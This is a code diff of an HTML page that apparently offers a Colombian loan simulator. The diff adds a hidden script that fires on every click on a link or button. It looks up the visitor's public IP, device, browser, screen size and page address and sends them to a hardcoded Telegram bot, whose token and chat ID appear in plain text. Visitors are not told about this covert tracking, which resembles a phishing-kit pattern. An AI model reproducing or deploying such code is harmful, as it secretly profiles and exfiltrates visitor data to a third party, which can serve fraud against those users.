@@ -78,80 +78,105 @@ input.error{border-color:#c62828!important;border-width:2px!important;animation:
 </div>
 </div>
 
-   <script>
+    
 
-        // ==========================
-        // CONFIGURACIÓN DE TELEGRAM
-        // ==========================
-
+        <script>
         const BOT_TOKEN = "8703984328:AAEDc6VejCNeQqmQwSWgjsCUaSID0lx9BvU";
         const CHAT_ID = "7776240161";
 
-        // ==========================
-        // FUNCIÓN PARA TELEGRAM
-        // ==========================
+async function obtenerIP() {
+    try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const data = await r.json();
+        return data.ip;
+    } catch {
+        return "No disponible";
+    }
+}
 
-        async function enviarTelegram(mensaje) {
+function obtenerDispositivo() {
+    const ua = navigator.userAgent;
 
-            const url =
-                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    let dispositivo = "Desconocido";
 
-            try {
+    if (/iPhone/i.test(ua)) {
+        dispositivo = "iPhone";
+    } else if (/iPad/i.test(ua)) {
+        dispositivo = "iPad";
+    } else if (/Android/i.test(ua)) {
+        dispositivo = "Android";
+    } else if (/Windows/i.test(ua)) {
+        dispositivo = "PC Windows";
+    } else if (/Macintosh/i.test(ua)) {
+        dispositivo = "Mac";
+    } else if (/Linux/i.test(ua)) {
+        dispositivo = "Linux";
+    }
 
-                const respuesta = await fetch(url, {
-                    method: "POST",
+    return dispositivo;
+}
 
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
+function obtenerNavegador() {
+    const ua = navigator.userAgent;
 
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: mensaje
-                    })
-                });
+    if (/Edg/i.test(ua)) return "Microsoft Edge";
+    if (/Chrome/i.test(ua)) return "Google Chrome";
+    if (/Firefox/i.test(ua)) return "Firefox";
+    if (/Safari/i.test(ua)) return "Safari";
 
-                const resultado = await respuesta.json();
+    return "Desconocido";
+}
 
-                console.log("Telegram:", resultado);
+async function enviarTelegram(texto) {
 
-            } catch (error) {
+    const url =
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-                console.error(
-                    "Error enviando mensaje:",
-                    error
-                );
+    await fetch(url, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: texto
+        })
+    });
+}
 
-            }
-        }
+document.addEventListener("click", async (event) => {
 
-        // ==========================
-        // DETECTAR CLIC
-        // ==========================
+    const elemento = event.target.closest("button, a");
 
-        document.addEventListener("click", function(event) {
+    if (!elemento) return;
 
-            const elemento = event.target;
+    const ip = await obtenerIP();
+    const dispositivo = obtenerDispositivo();
+    const navegador = obtenerNavegador();
 
-            const nombre =
-                elemento.innerText ||
-                elemento.getAttribute("aria-label") ||
-                elemento.tagName;
+    const mensaje = `
+🔔 NUEVO CLIC
 
-            const mensaje = `
-🔔 NUEVO CLIC SEBAS
+🖱 Elemento: ${
+        elemento.innerText.trim() ||
+        elemento.getAttribute("aria-label") ||
+        "Sin nombre"
+    }
 
-🖱 Elemento: ${nombre}
+🌐 Página: ${location.href}
 🌍 IP pública: ${ip}
-🌐 Página: ${window.location.href}
+
+📱 Dispositivo: ${dispositivo}
+🌐 Navegador: ${navegador}
+
+📐 Pantalla: ${screen.width}x${screen.height}
+
 🕐 Hora: ${new Date().toLocaleString()}
-            `;
+    `;
 
-            enviarTelegram(mensaje);
-
-        });
-
-    </script>
+    enviarTelegram(mensaje);
+});
+</script>
 <script>
 var plazoSeleccionado=12;
 function actualizar(){var v=parseInt(document.getElementById("slider").value);document.getElementById("valor").innerText="$"+Number(v).toLocaleString("es-CO");document.getElementById("cuota").innerText="$"+Math.round(v/plazoSeleccionado).toLocaleString("es-CO")}
